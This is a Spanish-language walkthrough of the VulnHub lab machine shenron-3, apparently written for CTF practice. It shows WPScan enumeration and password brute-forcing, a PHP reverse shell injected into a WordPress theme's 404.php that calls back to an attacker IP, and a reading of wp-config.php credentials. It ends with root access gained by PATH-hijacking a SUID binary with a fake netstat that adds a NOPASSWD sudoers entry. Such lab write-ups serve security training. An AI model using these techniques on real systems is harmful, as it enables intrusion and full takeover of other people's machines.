---
icon: flag
---

# shenron-3 VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sS <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 14:23 EDT
Nmap scan report for 192.168.5.148
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: shenron-3 | Just another WordPress site
|_http-generator: WordPress 4.6
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:CC:AB:32 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.5.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

Tendremos que editar el archivo `hosts`...

```shell
sudo nano /etc/hosts
```

```
<IP>        shenron
```

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,html,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.148/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 9849]
/license.txt          (Status: 200) [Size: 19935]
/readme.html          (Status: 200) [Size: 7342]
/server-status        (Status: 403) [Size: 278]
/wp-content           (Status: 200) [Size: 0]
/wp-includes          (Status: 200) [Size: 36863]
/wp-config.php        (Status: 200) [Size: 0]
[ERROR] Get "http://shenron/wp-login.php?redirect_to=http%3A%2F%2F192.168.5.148%2Fwp-admin%2F&reauth=1": dial tcp: lookup shenron on 192.168.5.2:53: no such host
/wp-login.php         (Status: 200) [Size: 2126]
/wp-trackback.php     (Status: 200) [Size: 135]
/xmlrpc.php           (Status: 405) [Size: 42]

===============================================================
Finished
===============================================================
```

Por lo que vemos tiene un `wordpress` por lo que haremos lo siguiente...

```shell
wpscan --url http://<IP>/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.5.148/ [192.168.5.148]
[+] Started: Mon May 27 14:28:39 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.148/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.148/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.148/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6 identified (Insecure, released on 2016-08-16).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.5.148/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.5.148/, Match: 'WordPress 4.6'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon May 27 14:28:45 2024
[+] Requests Done: 51
[+] Cached Requests: 4
[+] Data Sent: 11.183 KB
[+] Data Received: 64.14 KB
[+] Memory used: 152.352 MB
[+] Elapsed time: 00:00:06
```

Nos saca al usuario `admin`...

```shell
wpscan --url http://shenron/ --usernames admin --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://shenron/ [192.168.5.148]
[+] Started: Mon May 27 14:35:53 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://shenron/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://shenron/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://shenron/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6 identified (Insecure, released on 2016-08-16).
 | Found By: Rss Generator (Passive Detection)
 |  - http://shenron/index.php/feed/, <generator>https://wordpress.org/?v=4.6</generator>
 |  - http://shenron/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.6</generator>

[+] WordPress theme in use: twentyeleven
 | Location: http://shenron/wp-content/themes/twentyeleven/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://shenron/wp-content/themes/twentyeleven/readme.txt
 | [!] The version is out of date, the latest version is 4.6
 | Style URL: http://shenron/wp-content/themes/twentyeleven/style.css
 | Style Name: Twenty Eleven
 | Style URI: https://wordpress.org/themes/twentyeleven/
 | Description: The 2011 theme for WordPress is sophisticated, lightweight, and adaptable. Make it yours with a cust...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shenron/wp-content/themes/twentyeleven/style.css, Match: 'Version: 2.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / iloverockyou                                                                                                                             
Trying admin / iloverobbie Time: 00:03:38 <                                                                        > (31535 / 14375927)  0.21%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: iloverockyou

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon May 27 14:39:39 2024
[+] Requests Done: 31706
[+] Cached Requests: 6
[+] Data Sent: 15.803 MB
[+] Data Received: 18.681 MB
[+] Memory used: 314.203 MB
[+] Elapsed time: 00:03:45
```

Por lo que vemos las credenciales son las siguientes...

```
Username = admin
Password = iloverockyou
```

Por lo que nos logeamos en `wordpress`...

Una vez dentro si nos vamos a `Themes` en la seccion `Editor`, seleccionamos la casilla `404.php` y ahi inyectamos una `Reverse Shell`...

```php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Una vez puesta en esa plantilla, lo duardaremos dandole a `Update File`, hecho eso nos vamos dentro de `wordpress` a una `URL` que no exista para que nos salga la pagina `404.php` y se nos haga la `Reverse Shell`, pero antes estaremos a la escucha...

```shell
nc -lvnp <PORT>
```

Y nos vamos por ejemplo...

```
URL = http://shenron/index.php/category/uncategorizedd/
```

Al no existir en la pestaña nos saldra `Page not found` y ya habriamos conseguido la `shell` como `www-data`....

Sanitizamos la `shell`...

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si nos vamos a `/var/www/html/wp-config.php` y lo leemos, veremos lo siguiente...

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'Wordpress@123');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'U^RFX:KRZ_HlsZ?y9dt>e2ltmQoXX`QyB}3b:?v)A5{9_:|n;ZFZ2:Fi($/cAtY)');
define('SECURE_AUTH_KEY',  'Mt(Z)6k>bey!YVyoQvZXyB(r7sv*Fp4_yz^- B|7*jGBqcw3fH:1oAW66YqkqMzd');
define('LOGGED_IN_KEY',    '9L)Uj~w|HUsaRqD(_#:PnbjV<U~vrx8@+AI6MXjtMr-!S+@@r#EK yKi|.CUD!Qo');
define('NONCE_KEY',        '~!Ks,EO?79 SzB/|b-;rH:1,4%.<5<I`]6+11ysUWU3PxAv`Jw;WW~;mB_16Wq/?');
define('AUTH_SALT',        'eX?m#voW=i:ypWhp(yD QwY6U!o_.8iSK^c&Z6oN1~He/.vc-ji,sae9#^U_&Tey');
define('SECURE_AUTH_SALT', 'haDeiiO;pE<OCpO)J@%u1T1L|18?ur.1r$$C{N Gw/Z[4)YKK>nxDyMG-}hgpXxr');
define('LOGGED_IN_SALT',   '|m5Uz9^|D=ka-0E=GX-m@EZA!WE;|6t^V~ CT<#>,G5#cNJC k?UNFueKA~eR3RW');
define('NONCE_SALT',       ';6.RZvU,MjIJda{gH[/P #tk}xN5nh)ArgN|7[NN.0||@r~Guof_NE+K+ybIWbOY');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

Por lo que vemos probaremos a utilizar la misma contraseña que utilizamos con el usuario `admin` pero con este usuario llamado `shenron`...

```
User = shenron
Password = iloverockyou
```

Y veremos que si sirve....

leemos la flag en la `home` del mismo usuario...

> local.txt (flag1)

```
a57e2ff676cd040d58b375f686c7ced
```

Vemos un archivo llamado `network` en la `home` y tiene el `SUID` activado como `root` por lo que ejecutamos ese archivo como `root`, si nos lo pasamos a nuestro `host` con `python3`...

```shell
python3 -m http.server
```

`host`

```shell
wget http://<VICTIM_IP>:8000/network
```

Haremos lo siguiente...

```shell
strings network
```

Info:

```
/lib64/ld-linux-x86-64.so.2
3qKe
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
netstat -nltup
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
path.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Vemos que ejecuta un `netstat` por lo que cambiaremos el `PATH` creando nosotros un `netstat`malicioso para ser `root`....

Volviendo al servidor victima...

```shell
nano /tmp/netstat
```

```shell
#!/bin/bash

# Nombre de usuario a añadir al archivo sudoers
username="<USERNAME>"

# Añadir el usuario al archivo sudoers
echo "$username ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers > /dev/null

# Notificar al usuario que ha sido añadido
echo "El usuario '$username' ha sido añadido al archivo sudoers."
```

```shell
chmod +x /tmp/netstat
```

Lo guardamos en `/tmp/` como `netstat` y hacemos lo siguiente...

```shell
export PATH=/tmp:$PATH
```

Y ahora cuando ejecutamos de nuevo...

```shell
./network
```

Nos pondra que se nos añadio en el archivo `sudoers` por lo que ya podremos ser `root`...

```shell
sudo -l
```

Info:

```
Matching Defaults entries for shenron on shenron:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shenron may run the following commands on shenron:
    (ALL) NOPASSWD: ALL
```

```shell
sudo su
```

Y seremos `root`, leemos la flag...

> root.txt (flag2)

```
  mmmm  #                                                 mmmm 
 #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           mmm"
     "# #   #  #""""  #   #   #     #   #  #   #   """       "#
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         "mmm#"
                                                               
Your Root Flag Is Here :- a7ed78963dffd9450a34fcc4a0eecb98

Keep Supporting Me. ;-)
```
